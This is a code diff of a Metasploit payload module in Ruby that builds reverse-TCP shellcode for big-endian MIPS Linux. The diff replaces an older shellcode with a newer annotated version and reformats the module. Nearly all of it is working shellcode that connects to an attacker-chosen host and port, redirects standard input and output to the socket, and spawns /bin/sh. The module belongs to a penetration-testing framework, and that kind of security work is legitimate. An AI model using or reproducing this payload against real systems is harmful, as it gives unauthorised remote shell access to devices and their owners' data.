@@ -1,11 +1,7 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-# Written in a hurry using shellforge and my MIPS shellforge loader (avail. on cr0.org)
 
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
@@ -14,115 +10,114 @@ require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
-	include Msf::Payload::Single
-	include Msf::Payload::Linux
-	include Msf::Sessions::CommandShellOptions
+  include Msf::Payload::Single
+  include Msf::Payload::Linux
+  include Msf::Sessions::CommandShellOptions
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'Linux Command Shell, Reverse TCP Inline',
-			'Description'   => 'Connect back to attacker and spawn a command shell',
-			'Author'        => 'Julien Tinnes',
-			'License'       => MSF_LICENSE,
-			'Platform'      => 'linux',
-			'Arch'          => ARCH_MIPSBE,
-			'Handler'       => Msf::Handler::ReverseTcp,
-			'Session'       => Msf::Sessions::CommandShellUnix,
-			'Payload'       =>
-				{
-					'Offsets' => { },
-					'Payload' => ''
-				})
-		)
-	end
+  def initialize(info = {})
+    super(merge_info(info,
+      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
+      'Description'   => 'Connect back to attacker and spawn a command shell',
+      'Author'        =>
+        [
+          'rigan <imrigan[at]gmail.com>', # Original shellcode
+          'juan vazquez' # Metasploit module
+        ],
+      'References'    =>
+        [
+          'EDB' => '18226',
+        ],
+      'License'       => MSF_LICENSE,
+      'Platform'      => 'linux',
+      'Arch'          => ARCH_MIPSBE,
+      'Handler'       => Msf::Handler::ReverseTcp,
+      'Session'       => Msf::Sessions::CommandShellUnix,
+      'Payload'       =>
+        {
+          'Offsets' => { },
+          'Payload' => ''
+        })
+    )
+  end
 
-	def generate
-		if( !datastore['LHOST'] or datastore['LHOST'].empty? )
-			return super
-		end
+  def generate
+    if( !datastore['LHOST'] or datastore['LHOST'].empty? )
+      return super
+    end
 
-		host = Rex::Socket.addr_atoi(datastore['LHOST'])
-		port = Integer(datastore['LPORT'])
+    host = Rex::Socket.addr_atoi(datastore['LHOST'])
+    port = Integer(datastore['LPORT'])
 
-		host = [host].pack("N").unpack("cccc")
-		port = [port].pack("n").unpack("cc")
+    host = [host].pack("N").unpack("cccc")
+    port = [port].pack("n").unpack("cc")
 
-		shellcode =
-			"\x24\x09\xff\xef" +                    # li	t1,-17
-			"\x05\x10\xff\xff" +                    # bltzal	t0,0x4
-			"\x28\x08\x82\x82" +                    # slti	t0,zero,-32126
-			"\x01\x20\x48\x27" +                    # nor	t1,t1,zero
-			"\x01\x3f\xc8\x21" +                    # addu	t9,t1,ra
-			"\xaf\xb9\x85\x48" +                    # sw	t9,-31416(sp)
-			"\x23\xb9\x85\x48" +                    # addi	t9,sp,-31416
-			"\x3c\x1c\x00\x00" +                    # lui	gp,0x0
-			"\x27\x9c\x00\x00" +                    # addiu	gp,gp,0
-			"\x03\x99\xe0\x21" +                    # addu	gp,gp,t9
-			"\x27\xbd\xff\xd0" +                    # addiu	sp,sp,-48
-			"\xaf\xbc\x00\x00" +                    # sw	gp,0(sp)
-			"\xaf\xbc\x00\x28" +                    # sw	gp,40(sp)
-			"\x8f\x84\x00\x00" +                    # lw	a0,0(gp)
-			"\x00\x00\x00\x00" +                    # nop
-			"\x24\x84\x00\xf8" +                    # addiu	a0,a0,248
-			"\x00\x00\x00\x00" +                    # nop
-			"\x8c\x85\x00\x00" +                    # lw	a1,0(a0)
-			"\x8c\x87\x00\x04" +                    # lw	a3,4(a0)
-			"\x3c\x08" + host[0..1].pack("C2") +    # lui	t0,0xc0a8
-			"\x35\x06" + host[2..3].pack("C2") +    # ori	a2,t0,0x109
-			"\x27\xb9\x00\x18" +                    # addiu	t9,sp,24
-			"\x24\x03\x00\x02" +                    # li	v1,2
-			"\x24\x02" + port.pack("C2") +          # li	v0,4646
-			"\xaf\xa5\x00\x18" +                    # sw	a1,24(sp)
-			"\xaf\xa6\x00\x0c" +                    # sw	a2,12(sp)
-			"\xaf\xa7\x00\x1c" +                    # sw	a3,28(sp)
-			"\xa7\xa3\x00\x08" +                    # sh	v1,8(sp)
-			"\xa7\xa2\x00\x0a" +                    # sh	v0,10(sp)
-			"\xaf\xb9\x00\x20" +                    # sw	t9,32(sp)
-			"\xaf\xa0\x00\x24" +                    # sw	zero,36(sp)
-			"\x24\x04\x00\x02" +                    # li	a0,2
-			"\x24\x05\x00\x02" +                    # li	a1,2
-			"\x00\x00\x30\x21" +                    # move	a2,zero
-			"\x24\x02\x10\x57" +                    # li	v0,4183
-			"\x00\x00\x00\x0c" +                    # syscall
-			"\x24\x04\xff\xff" +                    # li	a0,-1
-			"\x10\x44\x00\x1a" +                    # beq	v0,a0,0x100
-			"\x00\x40\x18\x21" +                    # move	v1,v0
-			"\x00\x60\x20\x21" +                    # move	a0,v1
-			"\x24\x06\x00\x10" +                    # li	a2,16
-			"\x27\xa5\x00\x08" +                    # addiu	a1,sp,8
-			"\x24\x02\x10\x4a" +                    # li	v0,4170
-			"\x00\x00\x00\x0c" +                    # syscall
-			"\x14\x40\x00\x0e" +                    # bnez	v0,0xec
-			"\x00\x00\x28\x21" +                    # move	a1,zero
-			"\x24\x02\x0f\xdf" +                    # li	v0,4063
-			"\x00\x00\x00\x0c" +                    # syscall
-			"\x24\x05\x00\x01" +                    # li	a1,1
-			"\x24\x02\x0f\xdf" +                    # li	v0,4063
-			"\x00\x00\x00\x0c" +                    # syscall
-			"\x24\x05\x00\x02" +                    # li	a1,2
-			"\x24\x02\x0f\xdf" +                    # li	v0,4063
-			"\x00\x00\x00\x0c" +                    # syscall
-			"\x03\x20\x20\x21" +                    # move	a0,t9
-			"\x27\xa5\x00\x20" +                    # addiu	a1,sp,32
-			"\x00\x00\x30\x21" +                    # move	a2,zero
-			"\x24\x02\x0f\xab" +                    # li	v0,4011
-			"\x00\x00\x00\x0c" +                    # syscall
-			"\x00\x00\x20\x21" +                    # move	a0,zero
-			"\x24\x02\x0f\xa1" +                    # li	v0,4001
-			"\x00\x00\x00\x0c" +                    # syscall
-			"\x03\xe0\x00\x08" +                    # jr	ra
-			"\x27\xbd\x00\x30" +                    # addiu	sp,sp,48
-			"\x24\x04\x00\x01" +                    # li	a0,1
-			"\x24\x02\x0f\xa1" +                    # li	v0,4001
-			"\x00\x00\x00\x0c" +                    # syscall
-			"\x10\x00\xff\xe4" +                    # b	0xa0
-			"\x00\x60\x20\x21" +                    # move	a0,v1
-			"\x2f\x62\x69\x6e" +                    # "/bin"
-			"\x2f\x73\x68\x00" +                    # "/sh\x00"
-			"0"*80
-			# FIXME: remove extra 0 bytes!
+    shellcode =
+      # sys_socket
+      # a0: domain
+      # a1: type
+      # a2: protocol
+      "\x24\x0f\xff\xfa" + # li t7,-6
+      "\x01\xe0\x78\x27" + # nor t7,t7,zero
+      "\x21\xe4\xff\xfd" + # addi a0,t7,-3
+      "\x21\xe5\xff\xfd" + # addi a1,t7,-3
+      "\x28\x06\xff\xff" + # slti a2,zero,-1
+      "\x24\x02\x10\x57" + # li v0,4183 # sys_socket
+      "\x01\x01\x01\x0c" + # syscall 0x40404
 
-		return super + shellcode
-	end
+      # sys_connect
+      # a0: sockfd (stored on the stack)
+      # a1: addr (data stored on the stack)
+      # a2: addrlen
+      "\xaf\xa2\xff\xff" + # sw v0,-1(sp)
+      "\x8f\xa4\xff\xff" + # lw a0,-1(sp)
+      "\x34\x0f\xff\xfd" + # li t7,0xfffd
+      "\x01\xe0\x78\x27" + # nor t7,t7,zero
+      "\xaf\xaf\xff\xe0" + # sw t7,-32(sp)
+      "\x3c\x0e" + port.pack("C2") + # lui t6,0x1f90
+      "\x35\xce" + port.pack("C2") + # ori t6,t6,0x1f90
+      "\xaf\xae\xff\xe4" + # sw t6,-28(sp)
+      "\x3c\x0e" + host[0..1].pack("C2") + # lui t6,0x7f01
+      "\x35\xce" + host[2..3].pack("C2") + # ori t6,t6,0x101
+      "\xaf\xae\xff\xe6" + # sw t6,-26(sp)
+      "\x27\xa5\xff\xe2" + # addiu a1,sp,-30
+      "\x24\x0c\xff\xef" + # li t4,-17
+      "\x01\x80\x30\x27" + # nor a2,t4,zero
+      "\x24\x02\x10\x4a" + # li v0,4170  # sys_connect
+      "\x01\x01\x01\x0c" + # syscall 0x40404
+
+      # sys_dup2
+      # a0: oldfd (socket)
+      # a1: newfd (0, 1, 2)
+      "\x24\x0f\xff\xfd" + # li t7,-3
+      "\x01\xe0\x78\x27" + # nor t7,t7,zero
+      "\x8f\xa4\xff\xff" + # lw a0,-1(sp)
+      "\x01\xe0\x28\x21" + # move a1,t7
+      "\x24\x02\x0f\xdf" + # li v0,4063 # sys_dup2
+      "\x01\x01\x01\x0c" + # syscall 0x40404
+      "\x24\x10\xff\xff" + # li s0,-1
+      "\x21\xef\xff\xff" + # addi t7,t7,-1
+      "\x15\xf0\xff\xfa" + # bne t7,s0,68 <dup2_loop>
+
+      # sys_execve
+      # a0: filename (stored on the stack) "//bin/sh"
+      # a1: argv "//bin/sh"
+      # a2: envp (null)
+      "\x28\x06\xff\xff" + # slti a2,zero,-1
+      "\x3c\x0f\x2f\x2f" + # lui t7,0x2f2f "//"
+      "\x35\xef\x62\x69" + # ori t7,t7,0x6269 "bi"
+      "\xaf\xaf\xff\xec" + # sw t7,-20(sp)
+      "\x3c\x0e\x6e\x2f" + # lui t6,0x6e2f "n/"
+      "\x35\xce\x73\x68" + # ori t6,t6,0x7368 "sh"
+      "\xaf\xae\xff\xf0" + # sw t6,-16(sp)
+      "\xaf\xa0\xff\xf4" + # sw zero,-12(sp)
+      "\x27\xa4\xff\xec" + # addiu a0,sp,-20
+      "\xaf\xa4\xff\xf8" + # sw a0,-8(sp)
+      "\xaf\xa0\xff\xfc" + # sw zero,-4(sp)
+      "\x27\xa5\xff\xf8" + # addiu a1,sp,-8
+      "\x24\x02\x0f\xab" + # li v0,4011 # sys_execve
+      "\x01\x01\x01\x0c"  # syscall 0x40404
+
+    return super + shellcode
+  end
 
 end
